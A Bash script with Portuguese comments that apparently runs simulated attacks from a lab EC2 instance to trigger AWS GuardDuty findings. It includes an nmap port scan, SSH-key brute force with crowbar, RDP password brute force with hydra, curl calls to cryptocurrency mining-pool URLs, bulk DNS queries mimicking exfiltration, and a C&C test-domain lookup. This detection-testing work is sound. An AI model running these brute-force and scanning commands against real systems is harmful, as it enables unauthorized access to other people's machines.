#!/bin/bash

# Carregar os ips gerados no template
source localIps.sh

# 1 - Simulando varredura de portas
echo
echo '***********************************************************************'
echo '* Teste #1 - Varredura de porta interna                               *'
echo '*                                                                     *'
echo '* Simula o reconhecimento de uma varredura de portas causada por um   *'
echo '* autor interno ou externo.                                           *'
echo '*                                                                     *'
echo '* Isto sera tratado pelo Guard Duty como uma acao de prioridade baixa *'
echo '* pois nao se trata de um indicador claro de intencao maliciosa.      *'
echo '***********************************************************************'
echo
sudo nmap -sT $BASIC_LINUX_TARGET
echo
echo '-----------------------------------------------------------------------'
echo
# 2 - Brute force de SSH com lista de chaves encontradas na internet
echo '***********************************************************************'
echo '* Teste #2 - Brute force de SSH com chaves comprometidas              *'
echo '*                                                                     *'
echo '* Simulacao de um Brute Force na porta SSH que pode ser acessada      *'
echo '* nesta instancia.                                                    *'
echo '*                                                                     *'
echo '* Este teste utiliza chaves falsas em sequencia para ver se uma delas *'
echo '* ocasionalmente acabe funcionando.                                   *'
echo '***********************************************************************'
echo
for j in `seq 1 20`; do sudo ./crowbar/crowbar.py -b sshkey -s $BASIC_LINUX_TARGET/32 -U users -k ./compromised_keys; done
echo
echo '-----------------------------------------------------------------------'
echo
# 3 - Brute Force de RDP com lista de usuarios e senhas encontradas na internet
echo '***********************************************************************'
echo '* Teste #3 - Brute force RDP com lista de usuarios e senhas           *'
echo '*                                                                     *'
echo '* Simulacao de ataque Brute Force na porta de RDP do windows com uma  *'
echo '* lista de usuarios e senhas comuns.                                  *'
echo '*                                                                     *'
echo '* Assim como no teste de SSH, este teste utiliza chaves falsas        *'
echo '* em sequencia para ver se uma delas ocasionalmente acabe funcionando.*'
echo '***********************************************************************'
echo
echo 'Enviando 250 tentativas de senha no servidor windows'
hydra  -f -L /home/ec2-user/users -P ./passwords/password_list.txt rdp://$BASIC_WINDOWS_TARGET
echo
echo '-----------------------------------------------------------------------'
echo
# 4 - Mineracao de cripto moedas
echo '***********************************************************************'
echo '* Teste #4 - Atividades de mineracao de Cripto Moedas                *'
echo '*                                                                     *'
echo '* O Guard Duty possui uma inteligencia para identificar caso alguma   *'
echo '* instancia esteja se comunicando com um pool de mineracao           *'
echo '*                                                                     *'
echo '* Neste teste faremos apenas uma chamada em uma url do Pool sem baixar*'
echo '* nenhum tipo de arquivo.                                             *'
echo '*                                                                     *'
echo '* Isso sera suficiente para gerar o alerta.                           *'
echo '*                                                                     *'
echo '***********************************************************************'
echo
echo "Fazendo chamada nas urls de download dos toolkits das carteiras de bitcoin"
curl -s http://pool.minergate.com/dkjdjkjdlsajdkljalsskajdksakjdksajkllalkdjsalkjdsalkjdlkasj  > /dev/null &
curl -s http://xmr.pool.minergate.com/dhdhjkhdjkhdjkhajkhdjskahhjkhjkahdsjkakjasdhkjahdjk  > /dev/null &
echo
echo '-----------------------------------------------------------------------'
echo
# 5 - Simulacao de DNS Exfiltation
echo '***********************************************************************'
echo '* Teste #5 - DNS Exfiltration                                         *'
echo '*                                                                     *'
echo '* Uma tecnica comum de criacao de um tunem de dados pelo DNS para um  *'
echo '* dominio falso.                                                      *'
echo '* Explorando o fato de a maioria dos hosts ter portas de DNS de saida *'
echo '* abertas.                                                            *'  
echo '*                                                                     *'
echo '* Neste teste nada sera exportado, vamos apenas gerar uma atividade   *'
echo '* incomum de DNS o suficiente para acionar a deteccao do Guard Duty.  *'
echo '***********************************************************************'
echo
echo "Utilizando o DIG para fazer DNS query em lote" 
dig -f ./domains/queries.txt > /dev/null &
echo
# 6 - Backdoor:EC2/C&CActivity.B!DNS
echo '********************************************************************** *'
echo '* Teste #6 - Simulacao de Comando e Controle                           *'
echo '*                                                                      *'
echo '*O Guard Duty tem um domínio para testar uma acção de Backdor de C&C   *'
echo '*                                                                      *'
echo '*Este teste faz uma chamada na URL GuardDutyC2ActivityB.com para       *'
echo '*acionar este apontamento                                             *'
echo '***********************************************************************'
echo
echo "Fazendo chamada em GuardDutyC2ActivityB.com para acionar o apontamento"
dig GuardDutyC2ActivityB.com any
echo
echo '*****************************************************************************************************'
echo 'Resultados Esperados do GuardDuty'
echo
echo 'Teste 1: Varredura de porta interna'
echo 'Descoberta esperada: a instância ' $RED_TEAM_INSTANCE ' está realizando varreduras de porta de saida no host remoto. ' $BASIC_LINUX_TARGET
echo 'Apontamento: Recon:EC2/Portscan'
echo 
echo 'Teste 2 - Brute force de SSH com chaves comprometidas'
echo 'Esperando duas descobertas - uma para a deteccao de saida e outra para a deteccao de entrada'
echo 'Saida: ' $RED_TEAM_INSTANCE ' esta fazendo Brute Force de SSH contra ' $BASIC_LINUX_TARGET
echo 'Entrada: ' $RED_TEAM_IP ' esta fazendo Brute Force de SSH contra ' $BASIC_LINUX_INSTANCE
echo 'Apontamento: UnauthorizedAccess:EC2/SSHBruteForce'
echo
echo 'Teste 3: Brute force RDP com lista de usuarios e senhas '
echo 'Esperando duas descobertas - uma para a deteccao de saida e outra para a deteccao de entrada'
echo 'Saida: ' $RED_TEAM_INSTANCE ' esta fazendo Brute Force de RDP contra ' $BASIC_WINDOWS_TARGET
echo 'Entrada: ' $RED_TEAM_IP ' esta fazendo Brute Force de RDP contra ' $BASIC_WINDOWS_INSTANCE
echo 'Apontamento: UnauthorizedAccess:EC2/RDPBruteForce'
echo
echo 'Teste 4: Atividades de mineracao de Cripto Moedas  '
echo 'Descoberta esperada: EC2 Instance ' $RED_TEAM_INSTANCE ' esta consultando um nome de dominio associado a atividade de bitcoin'
echo 'Apontamento: CryptoCurrency:EC2/BitcoinTool.B!DNS'
echo
echo 'Teste 5: DNS Exfiltration'
echo 'Descoberta esperada: EC2 instance ' $RED_TEAM_INSTANCE ' esta tentando consultar nomes de domínio que se assemelham a a dominios de DNS exfiltration'
echo 'Apontamento: Backdoor:EC2/DNSDataExfiltration'
echo
echo 'Test 6: C&C Activity'
echo 'Descoberta esperada: EC2 instance ' $RED_TEAM_INSTANCE ' esta consultando um nome de dominio associado a um servidor de comando e controle '
echo 'Apontamento: Backdoor:EC2/C&CActivity.B!DNS'
echo